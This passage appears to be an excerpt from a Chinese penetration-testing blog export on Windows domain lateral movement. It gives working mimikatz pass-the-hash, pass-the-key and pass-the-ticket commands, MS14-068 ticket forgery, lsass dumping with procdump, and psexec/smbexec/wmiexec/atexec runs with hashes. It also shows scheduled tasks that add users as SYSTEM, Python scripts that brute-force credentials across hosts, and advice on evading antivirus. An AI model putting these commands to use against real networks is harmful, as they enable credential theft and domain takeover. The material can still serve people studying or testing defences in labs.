数据\n\n然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测\n\n检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机\n\n\n###0x02 利用PTH&amp;PTT&amp;PTK进行渗透测试\n\n\n\n\n\n\n\n\n\nPTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试\nPTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试\nPTK(pass the key) #利用的 ekeys aes256 进行的渗透测试\n\nPTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和NTLM Hash访问远程主机或服务，而不用提供明文密码。\n\nPTK：打了补丁才能用户都可以连接，采用 AES256 连接\n\nPTT 攻击不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击。\n\n\n\n\n\n\n\n\n\n\n\nPTT常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。\nMS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)\nMS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是KB3011780。\n0x02 PTH-NTML传递-Mimikatz0x00 未打补丁下的工作组及域连接先使用mimikatz获取凭证信息NTML：\n接着获取ekeys和aes1556：执行：mimikatz # sekurlsa::ekeys\n\n\n\n\n\n\n\n\n\n\n\n获取到aes256：5e90d14b7bb44da0531c6d8e081c20dcecbc9969304ae0d5448a364163b5142f\n（PTK传递aes256）\n0x01先尝试访问DC主机c盘：\ndir \\\\192.168.3.21\\c$ 或者\ndir \\\\DC.test.com\\c$\n\n\n可以看到找不到路径，是因为这时候使用本地用户登录，没有凭据。\n（假设已经拿到域控的hash）\n使用mimikatz执行命令：\nmimikatz # privilege::debug\n\n\n出现报错；是因为本地用户权限不够，这也是为什么要提权的原因。\n使用管理员权限运行：\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接域内主机\n\n\n会反弹一个cmd命令窗。\n执行：（必须要在弹出的cmd中执行，因为是管理员权限）\ndir \\\\192.168.3.21\\c$ 或者\ndir \\\\DC.test.com\\c$\n\n\n可查看DC主机的c盘所有文件。\n\n\n\n\n\n\n\n\n\n这时候可以访问DC主机c盘是由于使用mimikatz传递了凭据，导致本地用户有了权限去访问DC主机。\n0x02使用mimikatz获取到webserver主机的NTML后连接其工作组主机：\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接工作组内主机\n\n\n\n\n\n\n\n\n\n\n这里NTML值相同是因为DC主机和webserver主机密码相同。\n\n反弹cmd，这时候就能连接工作组内的主机（本地用户），由于环境原因，没有添加其他PC加入工作组；若添加用户后，则可以访问其PC主机。\n若命令中为domain:test(域)则是连接的域内用户。\n\n\n\n\n\n\n\n\n\n总结：\n\n通常渗透过程中，不能只单单渗透域内用户，也可以渗透本地用户；\n\n如果禁用了 NTLM 认证，PsExec 无法利用获得的NTLM hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。\n\n对于 8.1&#x2F;2012R2，安装补丁 KB2871997 的 Win7&#x2F;2008R2&#x2F;8&#x2F;2012 等，可以使用 AES keys代替 NT hash 来实现 PTK 攻击；\n\nKB2871997 补丁后的影响：\n\nPTH：没打补丁用户都可以连接，打了补丁只能 administrator 连接\nPTK：打了补丁才能用户都可以连接，采用 aes256 连接\n\n\n参考文章：\n\n\n​        https://www.freebuf.com/column/220740.html\n0x03 PTK-AES256传递-mimikatz0x00注意：PTK攻击必须打补丁才能连接上去，不打补丁连接不上去。\n0x01mimikatz获取DC主机aes：\nsekurlsa::ekeys #获取 aes\n\n\n连接DC主机：\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;aes256:266bb6886f375743d72ae5369e58fc1939f4ec7016e8f259f0c16b28ea6d9bb6\n\n\n反弹cmd命令窗。\n\n\n\n\n\n\n\n\n\nPTK攻击必须打补丁，不然不能使用aes连接。\n##0x04  PTT 传递-MS14-068利用\n0x00能实现普通用户直接获取域控 system 权限。\n0x011、首先查看当前sid（域用户）\nwhoami&#x2F;user\n\n\n\n2、执行MS14-068：\n\n\n\n\n\n\n\n\n\nms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码\nMS14-068.exe -u xiaobai@test.com -s S-1-5-21-4262547415-2925858076-1802417703-1111 -d 192.168.3.21 - p Admin123\n\n\n这里需要密码是当前域用户的密码：Admin123\n之后在执行MS14-068的文件夹中查看生成了TGT_xiaobai@test.com.ccache票据。\n\n3、执行klist命令查看当前是否存在连接：\n\n存在5个票据。\n4、清空当前机器中所有凭证（如果有域成员凭证会影响凭证伪造）\n执行:\nklist purge\n\n\n\n5、使用mimikatz将刚才生成的票据注入内存\nmimikatz # kerberos::ptc TGT_xiaobai@test.com.ccache\n\n\n注入票据成功。\n6、尝试连接目标主机：\n拒绝访问是由于不支持ip地址连接；\n使用域名连接：\n\n7、mimikatz相关命令：\n\n\n\n\n\n\n\n\n\nmimikatz # kerberos::purge &#x2F;&#x2F;清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造\nmimikatz # kerberos::list &#x2F;&#x2F;查看当前机器凭证\nmimikatz # kerberos::ptc 票据文件 &#x2F;&#x2F;将票据注入到内存中\n##0x05 PTT-传递kekeo票据注入\n###0x00\n下载地址：https://github.com/gentilkiwi/kekeo\n0x01先使用mimikatz获取NTLM：\n\n生成票据：\nkekeo &quot;tgt::ask &#x2F;user:xiaobai &#x2F;domain:test.com &#x2F;ntlm:e45a314c664d40a227f9540121d1a29d&quot;\n\n\n\n\n\n\n\n\n\n\n注意：\n这里的NTLM使用的是域用户xiaobai的NTLM\n\n在当前文件夹生成了票据：\n0x02将生成票据导入：\nkerberos::ptt TGT_xiaobai@TEST.COM_krbtgt~test.com@TEST.COM.kirbi\n\n\n\n\n\n\n\n\n\n\n\n注意：这里生成的票据需要和kekeo在同一文件夹，不然会导入失败。\n0x03清除凭证之后查看凭据：\n之后就可以连接目标主机。\n0x06 PTT传递-利用本地票据0x00这种方式需要管理员权限，首先使用mimikatz收集号本地的票据（之前与域控建立连接的票据收集起来），之后再导入内存。\n\n0x01mimikatz搜集本地票据：\nsekurlsa::tickets &#x2F;export\n\n\n当前文件夹查看收集到的凭据：\n\n0x02导入凭据：\nkerberos::ptt xxxxxxxxxx.xxxx.kirbi\n\n在搜集到的凭据里筛选凭据进行凭据注入。\n随便找一个凭据进行注入：\n\n最后可以使用klist查看是否注入票据。\n0x03凭据只存活10个小时，超过10个小时失效：\n\n0x07 国产 Ladon 内网杀器###0x00\n下载地址：\nk8gege&#x2F;Ladon: 大型内网渗透扫描器\n解压密码：k8gege.org\n0x01支持CMD，也支持GUI。\n","slug":"内网安全-域横向渗透【三】","date":"2022-06-28T13:22:21.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"3025b9eec92496f30bb6ae7638116cb8","title":"内网安全-域横向渗透【二】","content":"0x00 相关知识点0x001、Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值；\n2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码\n\n\n\n\n\n\n\n\n\n解决方法：\n1、利用哈希hash传递（pth，ptk等）进行移动；\n2、利用其它服务协议（SMB，WMI等）进行哈希移动；\n3、利用注册表操作开启Wdigest，Auth值进行获取；（提权）\n4、利用工具或第三方平台（Hashcat）进行破解获取。\n0x01Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。\n\n\n\n\n\n\n\n\n\n开启Wdigest：\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n0x01 Procdump+Mimikatz 配合获取密码0x00Mimilatz上传到目标服务器可能会被杀掉或者被拦截，配合Procdump进行密码获取，Procdump使微软自带工具，不会被检测。\n0x01procdump执行以下命令生成一个存储hash值的dmp文件：\nprocdump -accepteula -ma lsass.exe lsass.dmp\n\n\n本地mimikatz 上执行：\nprivilege::debug  #进行提权\n\n执行以下命令，使mimikatz载入lsass.dmp文件中的hash值进行获取密码。\nsekurlsa::minidump lsass.dmp\n\nsekurlsa::logonPasswords full\n\n\n获取到webserver密码：\n\n0x02 总结一般是将procdump.exe上传至目标服务器生成一个dmp文件，再将dmp文件复制到本地使用mimikatz进行获取密码；因为mimikatz上传至服务器可能会被拦截或者杀毒软件杀掉，所以在本地进行mimikatz进行密码获取。\n0x02 Hashcat破解获取 Windows-NTML-HashHashCat使用参考文章：\nhttps://www.freebuf.com/sectool/164507.html\nhttps://blog.csdn.net/SHIGUANGTUJING/article/details/90074614\n字典下载：https://wiki.skullsecurity.org/Passwords\n0x03 SMB 服务利用-psexec,smbexec(官方自带)0x00利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。\npstools下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools\n0x01 psexec 第一种方法（先将PSTools上传至目标服务器）\n先有 ipc 链接，psexec 需要明文或 hash 传递\nipc连接：\nnet use \\\\192.168.3.32\\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator\n\n\n先有 ipc 连接之后，参数 -s 以 system 权限运行\npsexec \\\\192.168.3.32 -s cmd\n\n\n获取到的使system权限；\n查看ip，拿到目标Iip的shell：\n\n0x02 psexec第二种方法不用建立 IPC 直接提供明文账户密码\n执行以下命令：（不需要建立IPC连接）\npsexec \\\\192.168.3.21 -u administrator -p Hacker123 -s cmd\n\n\n这种方式是建立在明文密码情况下，没有明文密码就需要利用Hash值。\n###0x03 impacket 工具包使用hash传递：\npsexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 #官方 Pstools 无法采用 hash连接\n\n\n使用 impacket 工具包：（非官方，容易被杀，需要做免杀）\npsexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32\n\n\n查看ip：\n0x04 smbexec明文传递无需建立ipc连接\n1、连接域用户：\n执行命令：\nsmbexec test&#x2F;administrator:Hacker123@192.168.3.21 \n\n\n拿到目标地址shell返回system权限。\n2、连接本地用户：\nsmbexec .&#x2F;administrator:Hacker123@192.168.3.32\n\n\n\n\n\n\n\n\n\n\n\n注意：\nsmbexec test&#x2F;administrator:&#72;&#97;&#x63;&#x6b;&#101;&#x72;&#x31;&#50;&#x33;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49; #这条命令是连接的test域内administrator用户；域内若是没有所连接的用户就会连接失败。\nsmbexec .&#x2F;administrator:&#72;&#x61;&#99;&#107;&#101;&#114;&#49;&#x32;&#51;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#x33;&#50; #这条命令连接是连接3.32主机本地administrator用户；\n用户名前面若是domain/则是域内用户；用户名前面若是./则是本地用户。\n0x05 smbexec哈希(hash)传递通过hash值连接：\n执行：\nsmbexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21\n\n\n执行：\nsmbexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32\n\n\n0x04  WMI 服务利用-cscript-wmiexec-wmic0x00 介绍WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。\n0x01 自带 WMIC 明文传递 无回显优点：官方自带WMIC\n缺点：无回显\n执行：\nwmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Hacker123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\\1.txt&quot;\n（连接3.21主机并执行ipconfig写如3.21主机c盘的1.txt）\n\n\n查看DC主机c盘生成了1.txt文件\n\n0x02 自带 cscript 明文传递 有回显优点：官方自带cscript，不会被检测，有回显\n缺点：需要下载wmiexec.vbs脚本配合运行\nwmiexec.vbs下载地址：\nhttps://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs\n执行：\ncscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Hacker123\n\n\n0x03 impacket wmiexec 明文或 hash 传递 有回显优点：有回显\n缺点：借助impacket包，需要做免杀\n1、明文传递：\nwmiexec .&#x2F;administrator:Hacker123@192.168.3.32 &quot;whoami&quot;\n\n\nwmiexec test&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot;\n\n\n2、hash传递：\n密文连接：\nwmiexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 &quot;whoami&quot;\n\n\nwmiexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21 &quot;whoami&quot;\n\n\n0x05 以上服务 hash 批量利用批量脚本：\nimport os,time\nips=&#123;\n'192.168.3.21',\n'192.168.3.25',\n'192.168.3.29',\n'192.168.3.30',\n'192.168.3.32'\n&#125;\nusers=&#123;\n'Administrator',\n'boss',\n'dbadmin',\n'fileadmin',\n'mack',\n'mary',\n'webadmin'\n&#125;\nhashs=&#123;\n'9075168608b7aba2428c8387bfeb9aee',\n'9075168608b7aba2428c8387bfeb9aee'\n&#125;\nfor ip in ips:\nfor user in users:\nfor mimahash in hashs:\n#wmiexec -hashes :hashgod/user@ipwhoami\nexec = \"wmiexec -hashes :\"+mimahash+\" god/\"+user+\"@\"+ip+\" whoami\"\nexec1 = \"wmiexec -hashes :\"+mimahash+\" ./\"+user+\"@\"+ip+\" whoami\"\nprint('--->' + exec + '&lt;---')\nprint('--->' + exec1 + '&lt;---')\nos.system(exec)\nos.system(exec1)\ntime.sleep(0.5)\n\n将写好的fuck_neiwang_002.py脚本编译为pyinstaller.exe可执行的exe文件。\n##0x06 总结\n思路：搜集内网主机ip，相关用户，mimikatz获取密码，所在域等等需要的信息；若是明文密码获取不到，只有hash值，利用脚本编译好的exe文件批量连接获取到的主机或者用户；在这之前考虑使用官方工具还是第三方工具，若是第三方工具还需考虑需不需要做免杀\n\n","slug":"内网安全-域横向渗透【二】","date":"2022-06-28T01:58:56.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"fd6e852f2bcb63bb7a3b0ef31dd46aab","title":"内网安全-域横向渗透【一】","content":"0x00脑图：\n0x01 明文传递 at&amp;schtasks###0x00 思路及流程\n1、在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，可以横向渗透拿下更多的主机在已知目标系统的用户明文密码的基础上， 使用at&amp;schtasks 命令，直接可以在远程主机上执行命令。\n2、获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令\n0x01 利用流程1、建立 IPC 链接到目标主机\n2、拷贝要执行的命令脚本到目标主机\n3、查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本\n4、删除 IPC 链接\n0x02 IPC1、介绍：\n IPC（Internet Process Connection）是共享“命名管道”，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。\n2、建立 IPC 常见的错误代码\n（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限\n（2）51：网络问题，Windows 无法找到网络路径\n（3）53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有防火墙等问题\n（4）67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$\n（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除\n（6）1326：账号密码错误\n（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况\n（8）2242：用户密码过期，目标有账号策略，强制定期更改密码\n3、建立 IPC 失败的原因\n（1）目标系统不是 NT 或2003以上的操作系统\n（2）对方没有打开 IPC$共享\n（3）对方未开启 139、445 端口，或者被防火墙屏蔽（139、445默认开启）\n（4）输出命令、账号密码有错误\n0x03\n\n\n\n\n\n\n\n\n[at] &amp; [schtasks]命令：at &lt; Windows2012（at适用于2012之前的版本）\nschtasks&gt;&#x3D;Windows2012（schtasks适用于2012之后的版本）\n1、使用at\n首先定位一个域控主机的IP地址：\n\n得到域控主机IP：192.168.3.21 \n查找所在域，出错了：\n\n\n\n\n\n\n\n\n\n\n解决方法：\n如果开了防火墙的话也是不可以执行的，先关闭防火墙。再检查以下。\n1.win+R ,输入services.msc 开启服务：Server ，WorkStation，computer Browser\n2.如果你的电脑没有computer Browser服务，win+R 输入appwiz.cpl ,选择启用或关闭Windows功能，选择SMB1.0&#x2F;CIFS 文件共享支持，重启电脑。然后开启以上3个服务。\n3.重启computer Browser服务即可。\n\n假设知道域控的ip地址和密码（通过minikatz获取明文、哈希密码）\n通过密码和ip地址连接域控主机\n\n\n\n\n\n\n\n\n\n相关连接域控命令（使用ipc:命名管道）\nnet use \\\\server\\ipc$&quot;password&quot; /user:username # 工作组\nnet use \\\\server\\ipc$&quot;password&quot; /user:domain\\username #域内\n（连接之前需要扫描端口139，445是否开启）\n\n\n\n\n\n\n\n\n\n使用命令：\nnet use \\\\192.168.3.21\\ipc$ &quot;Hacker123&quot; /user:test\\administrator\n使用ipc连接之后会出现已经连接到DC主机：\n\n之后在本地（webserver）c盘创建可执行文件，添加一个用户：\n\n\n拷贝执行文件（本地c盘add.bat）到目标机器（在实战中一般都是类似msf的后门）\n\n\n\n\n\n\n\n\n\ncopy add.bat \\\\192.168.3.21\\c$\n\n在域控主机DC可发现文件：\n\n最后添加计划任务（类似于Linux计划任务提权，这里的计划任务是以system执行的，是计算机的最高权限）\n\n\n\n\n\n\n\n\n\n执行命令：\nat \\\\192.168.3.21 19:56 c:\\add.bat\n\n\n\n\n\n\n\n\n\n\n执行命令：\nnet user\n在域控主机DC查看用户test是否被成功创建：\n\n2、使用schtasks（操作系统&gt;&#x3D;2012）\n\n\n\n\n\n\n\n\n\n建立ipc连接：net use \\\\192.168.3.32\\ipc$ &quot;password&quot; /user:domain\\administrator\nnet use \\\\192.168.3.32\\ipc$ &quot;Hacker123&quot; /user:test\\administrator\n\n复制文件到其 C 盘（如果拒绝访问，原因：域用户不能对本地Server 2012 SqlServer服务器进行操作）\n\n\n\n\n\n\n\n\n\ncopy add.bat \\\\192.168.3.32\\c$\n\n在SqlServer本地Administrator用户C盘查看：\n\n\n\n\n\n\n\n\n\n创建 adduser 任务对应执行文件\nschtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\\add.bat /F\n创建一个以system权限的，名为adduser的，时间为每日任务（延时执行），执行文件c:\\add.bat的，计划任务\n\n\n\n\n\n\n\n\n\n\n执行命令：\nschtasks /run /s 192.168.3.32 /tn adduser /#运行 adduser 任务\nschtasks /delete /s 192.168.3.21 /tn adduser /#删除 adduser 任务\n（删除任务是为了防止管理员发现）\n\n最后执行net user查看成功创建用户test1：\n\n0x02 明文 HASH 传递 atexec-impacket0x00 impacket介绍1、一句话命令，连接、提权全部搞定。\n2、第三方工具，非微软官方工具，易被杀毒软件查杀，实战中需要做免杀。\n3、atexec是Impacket网络协议工具包中的一个工具。\n4、Impacket工具包介绍：https://www.freebuf.com/sectool/175208.html\n5、Impacket 是一个Python类库，用于对SMB1-3或IPv4 &#x2F; IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。  （对协议进行访问，可以改成exe文件）\n6、下载地址：https://gitee.com/RichChigga/impacket-examples-windows/repository/archive/master.zip \n0x01尝试at命令的计划任务（2012版本以下）\n连接域控本地administrator（明文）\n执行命令：\n\natexec.exe .&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot; \n\n\n连接administrator返回system权限。\n0x02连接域控本地administrator（哈希）\n通过mimikatz获取到域控的哈希密码：（NTLM后面是哈希值）\n\n执行命令：\natexec.exe -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.21 &quot;whoami&quot;\n\n\n##0x03 明文 HASH 传递批量利用\n0x00 批量检测ip对应明文连接假设获取到了内网中的WebServer的权限，通过WebServer进行正常的横向渗透（实战中不知道域控密码）\n首先使用mimikatz获取webserver的用户名和密码：\n使用微软自带命令探寻网段的存活主机（自带内部命令推荐使用）\nfor &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”\n\n\n\n\n\n\n\n\n\n使用for循环，去ping,然后筛选出TTL &#x3D;的字段（发现：3.21（域控）；3.32（SQLserver）；）\n\n将两个ip地址写入ips.txt（爆破脚本）\n\n批量检测ip对应明文连接（for循环进行变量ip地址的ipc连接）\nFOR &#x2F;F %i in (ips.txt) do net use \\\\%i\\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator\n\n同一用户名和密码，去尝试ipc连接不同的ip地址\n\n可以看到连接3.31成功，连接3.21提示已经被相同的用户连接。\n###0x01 批量检测 IP 对应明文回显版\nFOR &#x2F;F %i in (ips.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami\n\n\n\n\n\n\n\n\n\n\n这里获取到system权限后，可以重复以上操作，通过mimikatz不断的获取本地的密码，进而去获取域内用户的权限。（这里atexec.exe容易被查杀，可以做免杀，也可以通过计划任务等等获取权限） \n\n\n3.31的ip返回system。\n0x02 批量检测明文对应FOR &#x2F;F %i in (pass.txt) do atexec.exe .&#x2F;administrator:Hacker123@%i whoami\n\n\n\n\n\n\n\n\n\n\n流程：\n1.先获取系统权限\n2.将mimikatz复制到对方主机\n3.运行mimikatz获取明文或者哈希密码\n4.将获取到的密码添加到爆破字典 \n0x03 批量检测HASH对应FOR &#x2F;F %i in (hash.txt) do atexec.exe -hashes :%i .&#x2F;administrator@192.168.3.21 whoami \n\n\n\n0x04 明文-HASH传递 批量利用-升级版遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。\n1、安装pyinstall:\npip install pyinstall\n\n2、生成可执行EXE：\npyinstaller -F fuck_neiwang_001.py\n\n脚本：\nimprot os,t\n\nips=&#123;\n    '192.168.3.25',\n    '192.168.3.29',\n    '192.168.3.30',\n    '192.168.3.21',\n    '192.168.3.31'\n&#125;\n\nusers=&#123;\n    'Administrator',\n    'dbamain',\n    'admin'\n&#125;\n\npass=&#123;\n    'admin'.\n    'admin123'\n    'hacker'\n    'hacker123'\n&#125;\n\nfor ip in ips:\n    for user in users:\n        for mima in pass:\n        exec=\"net use \\\\\"+ \"\\\\\" +ip+'ipc$'+mima+'/user:test\\\\'+user\n        print('--->'+exec+'&lt;---')\n        os.system(exec)\n        time.sleep(1)\n\n","slug":"内网安全-域横向渗透【一】","date":"2022-06-27T00:59:07.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"71056ae21dd2a465161404f46f6a02f9","title":"内网安全-域环境与工作组及局域网探针","content":"0x00脑图：\n\n0x01 基本知识###0x00 网络拓扑\n\n0x01 DMZ（非军事）区域DMZ，是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。\n0x02 工作组&amp;域环境1、工作组：地位平等，管理分散，没有集中管理。（范围小的计算机在局域网内）\n2、域环境：地位不平等，管理集中，实现集中管理。（共享文件，不需要每台计算机去配置用户进行访问，可以直接访问）\n3、域环境也可以简单的理解为工作组的升级版，更好管理。\n4、这里我们把域环境和工作组区分开来是因为他们的攻击手段不同：工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。\n0x03 域控制器DC域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器。\n0x04 AD活动目录1、AD是微软所提供的目录服务（查询，身份验证）,活动目录的核心包含了活动目录数据库。\n2、在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server 以及Windows Datacenter Server的目录服务。\n3、Active Directory储存了有关网络对象的信息，并且让管理员和用户能够轻松的查找和使用这些信息。\n0x05 单域网络由主域管理器和任意数量的代理程序组成（公司都在一起，都在这个域内）\n\n可以将单域网络与其它网络（单域或多域）组合以满足多站点的需求\n\n0x06 父域和子域总公司和分公司的关系，总公司可以管分公司\n\n图片来源：https://cloud.tencent.com/developer/news/226717\n0x07 域树和域林1、域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。树中的域通过信任关系连接起来，活动目录包含一个或多个域树\n2、域林是指由一个或多个没有形成连续名字空间的域树组成，它与上面所讲的域树最明显的区别就在于这些域树之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。\n0x08 Linux域渗透问题1、Linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，Linux还是比较适合做服务器好一点。\n（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）\n###0x09 局域网技术适用问题\n1、广播风暴\n2、ARP断网攻击\n3、DNS欺骗\n4、IP冲突攻击\n5、路由无线攻击\n6、……\n##0x01 实例\n0x00 环境介绍图中属于单域环境，Windows2008R2作为域控DC，有五个域成员主机；\n1、fileserver文件服务器、SqlServer数据库服务器、webserver网站服务器和两台个人PC。他们都是在192.168.3.0这个网段\n2、网站服务器有两个网卡，一个在3.31一个在230.131，这个230.133就好比是它的一个对外出口（外网接口）\n3、kali攻击机就好比攻击者，它通过230.131这个接口进入网站服务器计算机，由于这台计算机是处于内网连接（这里没有DMZ），所有它享有3这个网段的访问权限。\n4、拿下网站服务器后的首要攻击目标就是DC！只要拿下DC，也就相当于同时拿下了所有域成员主机权限。\n\n0x01 系统信息搜集假设已经拿下了内网web服务器，进行信息搜集：\n1、systeminfo命令查看webserver详细信息（操作系统版本、补丁编号等信息）。\n\n\n2、net start 启动服务（查看当前主机开启了哪些服务，从服务中就可以判断它是什么角色，比如说文件传输、数据库等等）\n\n3、tasklist 进程列表（查看当前主机开启了哪些进程）\n\n4、schtasks 计划任务（若报错无法加载列资源，说明你的权限不够，因此要提权才能使用该命令）\n（计划任务是以system权限运行）\n\n0x02 网络信息搜集为了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备\n1、ipconfig &#x2F;all 判断存在域-最简单方式查看主DNS后缀\n和DNS域名解析一样，Test.test.com为sqlserver. Test.test.com的父域名\n\n2、net view &#x2F;domain 判断存在域\n\n服务器测试失败；正确结果如下图：\n会出现GOD这个是域名（图来源于互联网）。\n本机执行：\n3、net time &#x2F;domain 判断主域（主域就是域控的意思）\n因为域成员计算机的时间一般会以域控制器为准，所以当执行net time &#x2F;domain命令时，该计算机会去域控获取时间；此时返回的WIN-75NA0949GFB.Test.test.com就是域控的计算机全名。然后可以通过nslookup来最终确认域控IP：\n可以通过nslookup和ping命令获取域控的对应ip地址，域控主机ip为3.21：\n\n\n4、netstat -ano 当前网络端口开放\n0x03 用户信息收集为了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试系统默认常见用户身份\n1、系统默认常见用户身份：\n\n\n\n\n\n\n\n\n\nDomain Admins：域管理员（默认对域控制器有完全控制权）\nDomain Computers：域内机器\nDomain Controllers：域控制器\nDomain Guest：域访客，权限低\nDomain Users：域用户\nEnterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）\n\n\n2、相关用户收集操作命令：\n\n\n\n\n\n\n\n\n\nwhoami &#x2F;all 用户权限\nnet config workstation 登录信息\nnet user 本地用户\nnet localgroup 本地用户组\nnet user &#x2F;domain 获取域用户信息\nnet group &#x2F;domain 获取域用户组信息\nwmic useraccount get &#x2F;all 涉及域用户详细信息\nnet group “Domain Admins” &#x2F;domain 查询域管理员账户\nnet group “Enterprise Admins” &#x2F;domain 查询管理员用户组\nnet group “Domain Controllers” &#x2F;domain 查询域控制器\n\n其他命令也如此，搜集相关信息。\n进行计算机管理时，发现需要验证本地管理员的密码（域成员（webadmin）的权限不够，需要域管理员（Administrator）或者本地管理员才行）\n\n0x04 凭据信息收集为了收集各种密文，明文，口令等，为后续横向渗透做好测试准备\n\n\n\n\n\n\n\n\n\n计算机用户 HASH，明文获取脚本：mimikatz(win)，mimipenguin(linux)\n计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)\nNetsh WLAN show profiles\nNetsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear\n1.站点源码备份文件、数据库备份文件等\n2.各类数据库 Web 管理入口，如 PHPMyAdmin\n3.浏览器保存密码、浏览器 Cookies4.其他用户会话、3389 和 ipc$连接记录、回收站内容\n5.Windows 保存的 WIFI 密码\n6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等 